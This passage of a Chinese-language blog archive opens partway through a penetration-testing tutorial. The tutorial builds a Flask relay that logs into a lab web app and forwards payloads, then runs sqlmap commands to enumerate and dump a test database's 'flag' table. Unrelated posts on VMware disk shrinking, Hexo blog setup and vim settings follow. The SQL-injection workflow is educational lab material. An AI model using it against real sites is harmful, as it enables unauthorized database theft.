class="string">&quot;http://192.168.154.130:80/web/login.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.154.130&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.154.130/web/login.php&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;email&quot;</span>: email, <span class="string">&quot;pw&quot;</span>: password, <span class="string">&quot;submit&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r1 = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxy)</span><br><span class="line">    <span class="comment"># 登陆后跳转到首页</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.154.130/web/index.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    resp = session.get(burp0_url, headers=burp0_headers, proxies=proxy)    </span><br><span class="line">    resp.encoding = resp.apparent_encoding</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span>  request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        payload = request.form.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> custom_fun(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>从代码上可以看到，只需要把请求逻辑写到<code>custom_fun</code>函数中，把最终结果的响应包return给flask，剩下的就可以交给sqlmap了，优雅！</p>
<p>这里说一个小技巧，可以使用Burp的拓展<code>Copy As Python-Requests</code>来一键把burp的请求复制为Python requests请求：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-19-19.png"><br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-21-23.png"></p>
<p>然后使用sqlmap测试一下，因为是通过本地flask中转，我们的sqlmap的target应该是本地的flask服务端口，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://127.0.0.1:5000/?payload=1</span><br></pre></td></tr></table></figure>
<p>检测时flask服务的输出：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-30-49.png"><br>成功检测到注入点：<br><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-25-10.png"><br>当前数据库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://127.0.0.1:5000/?payload=1 --current-db</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-27-11.png"><br>跑表名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://127.0.0.1:5000/?payload=1 -D <span class="built_in">test</span> --tables</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-28-11.png"><br>跑flag表数据：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://127.0.0.1:5000/?payload=1 -D <span class="built_in">test</span> -T flag --dump</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/08/26/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-FLASK%E5%8A%A0%E5%B7%A5%E4%B8%AD%E8%BD%ACSQLMAP%E6%B5%81%E9%87%8F/2020-07-21-10-44-35.png"></p>
<h3 id="测试环境代码"><a href="#测试环境代码" class="headerlink" title="测试环境代码"></a>测试环境代码</h3><p>GitHub：<a href="https://github.com/ryanInf/fakeZhangSan">https://github.com/ryanInf/fakeZhangSan</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware虚拟机磁盘空间压缩</title>
    <url>/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/</url>
    <content><![CDATA[<p>可以使用VMware官方的vmware tools进行压缩。<br>压缩前需要删除虚拟机的快照、链接克隆等，然后在虚拟机中执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>
<p>执行后等待进度条结束即可：<br><img data-src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-08.png"></p>
<a id="more"></a>

<p>压缩前忘了截图了，删除快照等后大概占用33G，实际虚拟机硬盘使用：<br><img data-src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-34.png"></p>
<p>压缩后占用：<br><img data-src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-47.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.modb.pro/db/13321">VMware 虚拟机磁盘占用过大怎么办？</a></p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo建站笔记</title>
    <url>/2019/07/08/hexo-blog/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>因一次意外，hexo博客源码被删除干净，抽空重新配置hexo并重新写了之前的文章，这里把配置hexo各项功能作个记录。</p>
<h3 id="hexo版本"><a href="#hexo版本" class="headerlink" title="hexo版本"></a>hexo版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">λ hexo version</span><br><span class="line">hexo-cli: 4.2.0</span><br><span class="line">os: Windows_NT 10.0.18363 win32 x64</span><br><span class="line">node: 12.18.3</span><br><span class="line">v8: 7.8.279.23-node.39</span><br><span class="line">uv: 1.38.0</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">brotli: 1.0.7</span><br><span class="line">ares: 1.16.0</span><br><span class="line">modules: 72</span><br><span class="line">nghttp2: 1.41.0</span><br><span class="line">napi: 6</span><br><span class="line">llhttp: 2.0.4</span><br><span class="line">http_parser: 2.9.3</span><br><span class="line">openssl: 1.1.1g</span><br><span class="line">cldr: 37.0</span><br><span class="line">icu: 67.1</span><br><span class="line">tz: 2019c</span><br><span class="line">unicode: 13.0</span><br></pre></td></tr></table></figure>

<h3 id="安装next主题"><a href="#安装next主题" class="headerlink" title="安装next主题"></a>安装next主题</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> hexo</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span></span><br></pre></td></tr></table></figure>

<h3 id="创建-“关于我”-页面"><a href="#创建-“关于我”-页面" class="headerlink" title="创建 “关于我” 页面"></a>创建 “关于我” 页面</h3><p>新建一个 about 页面：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page &quot;about&quot;</span><br></pre></td></tr></table></figure>
<p>菜单显示 about 链接，在主题的 _configy.yml 设置中将 menu 中 about 前面的注释去掉即可。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="创建分类页面"><a href="#创建分类页面" class="headerlink" title="创建分类页面"></a>创建分类页面</h3><p>添加一个 分类 页面，并在菜单中显示页面链接。</p>
<ol>
<li>新建一个页面，命名为 categories 。命令如下：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure></li>
<li>编辑刚新建的页面，将页面的类型设置为<code>categories</code>，主题将自动为这个页面显示所有分类。<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2014-12-22 12:39:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
注意：如果有启用<code>多说</code>或者<code>Disqus</code>评论，默认页面也会带有评论。需要关闭的话，请添加字段<code>comments</code>并将值设置为<code>false</code>，如：<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2014-12-22 12:39:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="attr">comments:</span> <span class="literal">false</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
在菜单中添加链接。编辑主题的<code>_config.yml</code>，将<code>menu</code>中的<code>categories: /categories</code>注释去掉，如下:<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="创建标签云页面"><a href="#创建标签云页面" class="headerlink" title="创建标签云页面"></a>创建标签云页面</h3><p>添加一个标签云页面，并在菜单中显示页面链接。</p>
<ol>
<li>新建一个页面，命名为<code>tags</code>。命令如下：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page &quot;tags&quot;</span><br></pre></td></tr></table></figure></li>
<li>编辑刚新建的页面，将页面的类型设置为<code>tags</code>，主题将自动为这个页面显示标签云。<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">All</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2014-12-22 12:39:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
注意：如果有启用<code>多说</code>或者<code>Disqus</code>评论，默认页面也会带有评论。需要关闭的话，请添加字段<code>comments</code>并将值设置为<code>false</code>，如：<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">All</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2014-12-22 12:39:04</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="attr">comments:</span> <span class="literal">false</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></li>
<li>在菜单中添加链接。编辑主题的<code>_config.yml</code>，添加<code>tags</code>到<code>menu</code>中，如下:<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="站内搜索功能"><a href="#站内搜索功能" class="headerlink" title="站内搜索功能"></a>站内搜索功能</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
<p>打开主题配置文件_config.yml,搜索local_search,其值改为true：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># If auto, trigger search by changing input.</span></span><br><span class="line">  <span class="comment"># If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span></span><br><span class="line">  <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h3 id="添加头像"><a href="#添加头像" class="headerlink" title="添加头像"></a>添加头像</h3><p>把头像图片下载到以下目录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">blog\themes\next\source\images\avatar.jpg</span><br></pre></td></tr></table></figure>
<p>然后在next主题的——config.yml下面填入url：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.jpg</span></span><br></pre></td></tr></table></figure>

<h3 id="本地图片引用"><a href="#本地图片引用" class="headerlink" title="本地图片引用"></a>本地图片引用</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/7ym0n/hexo-asset-image --save</span><br></pre></td></tr></table></figure>
<p>安装成功后，需要在根路径的_config.yml如下配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>然后清除hexo缓存</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>
<p>这样新建的文章会同时自动生成同文章名的文件夹</p>
<p>平时我使用<code>vs code</code>写<code>markdown</code>文档，配合<code>Paste Image</code>插件，只需<code>Ctrl + Alt + V</code>可自动把剪切板的图片复制到同路径的<code>images</code>文件夹下，并在文章中生成图片链接。因hexo只能读取文章同路径下同文章名的文件夹下的文件，需要把<code>images</code>文件夹的所有图片复制到同文章名的文件夹下，然后在文章中把所有<code>images/</code>替换成空即可</p>
<p><strong>示例：</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">MacGesture2-Publish</span></span><br><span class="line"><span class="string">├──</span> <span class="string">apppicker.jpg</span></span><br><span class="line"><span class="string">├──</span> <span class="string">logo.jpg</span></span><br><span class="line"><span class="string">└──</span> <span class="string">rules.jpg</span></span><br><span class="line"><span class="string">MacGesture2-Publish.md</span></span><br></pre></td></tr></table></figure>
<p>使用<code>![logo](logo.jpg)</code>来引入<code>logo.jpg</code></p>
<h3 id="自动部署到github"><a href="#自动部署到github" class="headerlink" title="自动部署到github"></a>自动部署到github</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<p>然后需要在根路径的_config.yml配置你的git URL</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/xxx/xxx.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<p>然后使用hexo d命令可部署到github</p>
<h3 id="添加流程图支持"><a href="#添加流程图支持" class="headerlink" title="添加流程图支持"></a>添加流程图支持</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-filter-flowchart</span><br></pre></td></tr></table></figure>
<p>安装成功后，需要在根路径的_config.yml文件添加下列代码</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">flowchart:</span></span><br><span class="line">  <span class="comment"># raphael:   # optional, the source url of raphael.js</span></span><br><span class="line">  <span class="comment"># flowchart: # optional, the source url of flowchart.js</span></span><br><span class="line">  <span class="attr">options:</span> <span class="comment"># options used for `drawSVG`</span></span><br></pre></td></tr></table></figure>
<h3 id="设置阅读全文按钮"><a href="#设置阅读全文按钮" class="headerlink" title="设置阅读全文按钮"></a>设置阅读全文按钮</h3><p>只需在文章中添加<code>&lt;!-- more --&gt;</code>标签就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这是摘要</span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line">这是全文</span><br></pre></td></tr></table></figure>
<h3 id="草稿功能"><a href="#草稿功能" class="headerlink" title="草稿功能"></a>草稿功能</h3><p>新建草稿</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo new draft &lt;title&gt;</span></span><br></pre></td></tr></table></figure>
<p>本机预览草稿</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo S --draft</span></span><br></pre></td></tr></table></figure>
<p>将草稿发布为正式文章</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo P &lt;filename&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="配置评论功能"><a href="#配置评论功能" class="headerlink" title="配置评论功能"></a>配置评论功能</h3><p>最开始是想使用gitalk，但发现<code>gitalk</code>权限过高，并且会泄露<code>client_id</code>和<code>client_secret</code>，所以放弃了，改为使用<code>LiveRe</code>，只需注册后拿到<code>uid</code>再复制到<code>next</code>主题目录下的<code>_config.yml</code>，<code>livere_uid:</code>后填入即可</p>
<h3 id="图片点击预览放大功能"><a href="#图片点击预览放大功能" class="headerlink" title="图片点击预览放大功能"></a>图片点击预览放大功能</h3><p>进入主题目录，下载<code>fancybox</code>包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog\themes\next</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-fancybox3 <span class="built_in">source</span>/lib/fancybox</span><br></pre></td></tr></table></figure>
<p>在主题配置文件中启用<code>fancybox</code>：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://github.com/theme-next/theme-next-fancybox3">https://github.com/theme-next/theme-next-fancybox3</a></p>
<h3 id="添加一个二次元人物"><a href="#添加一个二次元人物" class="headerlink" title="添加一个二次元人物"></a>添加一个二次元人物</h3><p>效果如下：<br><img data-src="/2019/07/08/hexo-blog/2020-08-21-18-23-16.png"><br>首先安装live2d插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure>
<p>在Hexo的<code>_config.yml</code>文件中添加下面代码：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-wanko</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">150</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">300</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">react:</span></span><br><span class="line">    <span class="attr">opacity:</span> <span class="number">0.7</span></span><br></pre></td></tr></table></figure>
<p>选择一个喜欢的模型，从这个url选择：<a href="https://huaji8.top/post/live2d-plugin-2.0/">https://huaji8.top/post/live2d-plugin-2.0/</a></p>
<p>选好模型后根据以下包名安装相应的npm模块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">live2d-widget-model-chitose</span><br><span class="line">live2d-widget-model-epsilon2_1</span><br><span class="line">live2d-widget-model-gf</span><br><span class="line">live2d-widget-model-haru&#x2F;01 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haru&#x2F;02 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haruto</span><br><span class="line">live2d-widget-model-hibiki</span><br><span class="line">live2d-widget-model-hijiki</span><br><span class="line">live2d-widget-model-izumi</span><br><span class="line">live2d-widget-model-koharu</span><br><span class="line">live2d-widget-model-miku</span><br><span class="line">live2d-widget-model-ni-j</span><br><span class="line">live2d-widget-model-nico</span><br><span class="line">live2d-widget-model-nietzsche</span><br><span class="line">live2d-widget-model-nipsilon</span><br><span class="line">live2d-widget-model-nito</span><br><span class="line">live2d-widget-model-shizuku</span><br><span class="line">live2d-widget-model-tororo</span><br><span class="line">live2d-widget-model-tsumiki</span><br><span class="line">live2d-widget-model-unitychan</span><br><span class="line">live2d-widget-model-wanko</span><br><span class="line">live2d-widget-model-z16</span><br></pre></td></tr></table></figure>
<p>如<code>hijiki</code>对应的是<code>live2d-widget-model-hijiki</code>，然后通过<code>npm install 模型的包名</code>来安装，安装后在<code>_config.yml</code>修改对应的包名来启用：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">model:</span></span><br><span class="line"> <span class="attr">use:</span> <span class="string">live2d-widget-model-hijiki</span></span><br></pre></td></tr></table></figure>

<h3 id="添加背景动画"><a href="#添加背景动画" class="headerlink" title="添加背景动画"></a>添加背景动画</h3><p>安装动画js依赖：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog\themes\next</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-three <span class="built_in">source</span>/lib/three</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-canvas-ribbon <span class="built_in">source</span>/lib/canvas-ribbon</span><br></pre></td></tr></table></figure>
<p>在<strong>NexT</strong>主题的<code>_config.yml</code>文件启用以下配置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">three_waves:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">OR</span></span><br><span class="line"><span class="attr">canvas_lines:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">OR</span></span><br><span class="line"><span class="attr">canvas_sphere:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>以上三种动画只能选一个：</p>
<ul>
<li>three 的动画是线和点的组合，随鼠标位置的移动而变化。</li>
<li>canvas_nest 是自由移动的线条，当你的鼠标移动时，线条汇聚在你的鼠标位置上，形成多边形。</li>
<li>canvas_ribbon 是随鼠标点击而变化颜色的彩带。</li>
</ul>
<p>启用彩虹背景：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canvas_ribbon:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>参考：<br><a href="https://github.com/theme-next/theme-next-three">https://github.com/theme-next/theme-next-three</a><br><a href="https://github.com/theme-next/theme-next-canvas-ribbon">https://github.com/theme-next/theme-next-canvas-ribbon</a></p>
<h3 id="启用顶部的阅读进度条"><a href="#启用顶部的阅读进度条" class="headerlink" title="启用顶部的阅读进度条"></a>启用顶部的阅读进度条</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">reading_progress:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="启用页面加载动画"><a href="#启用页面加载动画" class="headerlink" title="启用页面加载动画"></a>启用页面加载动画</h3><p>页面加载动画指的是刚访问页面，各元素还没有加载完成时，显示的加载进度动画。NexT 提供了多种样式，读者可以自己尝试。<br>安装依赖：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog\themes\next</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-pace <span class="built_in">source</span>/lib/pace</span><br></pre></td></tr></table></figure>
<p>启用配置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pace:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>参考：<br><a href="https://github.com/theme-next/theme-next-pace">https://github.com/theme-next/theme-next-pace</a><br><a href="https://tding.top/archives/dfac1e9c.html">https://tding.top/archives/dfac1e9c.html</a></p>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>其它</tag>
      </tags>
  </entry>
  <entry>
    <title>vim简易快捷配置</title>
    <url>/2020/08/21/vim%E7%AE%80%E6%98%93%E5%BF%AB%E6%8D%B7%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经常需要在不同的Linux上切换，有些Linux默认配置的vim用起来很不舒服，所以记录一个简单的vim配置，用起来会顺手一点。</p>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>将下面代码保存到<code>~/.vimrc</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">syntax on</span><br><span class="line">filetype indent on</span><br><span class="line">set nocp</span><br><span class="line">set nocompatible</span><br><span class="line">set autoread</span><br><span class="line">set mouse&#x3D;</span><br><span class="line">set showcmd</span><br><span class="line">set showmatch</span><br><span class="line">set autoindent</span><br><span class="line">set softtabstop&#x3D;4</span><br><span class="line">set shiftwidth&#x3D;4</span><br><span class="line">set tabstop&#x3D;4</span><br><span class="line">set nu</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
